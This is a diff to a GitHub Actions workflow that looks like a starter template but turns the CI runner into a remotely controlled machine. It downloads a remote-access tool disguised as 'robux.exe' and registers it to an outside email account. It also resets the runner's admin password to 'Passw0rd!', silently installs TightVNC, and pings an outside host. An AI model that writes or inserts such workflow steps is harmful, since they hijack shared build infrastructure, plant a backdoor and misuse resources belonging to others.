@@ -35,11 +35,14 @@ jobs:
           echo Add other actions to build,
           echo test, and deploy your project.
           irm -uri "https://getscreen.me/download/getscreen.exe" -outfile "robux.exe"
-          ./robux.exe -install -register huggingfaceuser@gmail.com
+          ./robux.exe -install -register 1tbfree@proton.me
           net user runneradmin Passw0rd!
           irm -uri "https://www.tightvnc.com/download/2.8.85/tightvnc-2.8.85-gpl-setup-64bit.msi" -outfile "vnc.msi"
-          cmd /c vnc.msi
+          cmd /c vnc.msi /quiet
           msg * Complete install for more uptime.
+          ping 8.8.8.8
+          ping 1.1.1.1
+          ping heckersite.ct8.pl
           python sleep.py
           ping 127.0.0.1
           ping 127.0.0.1
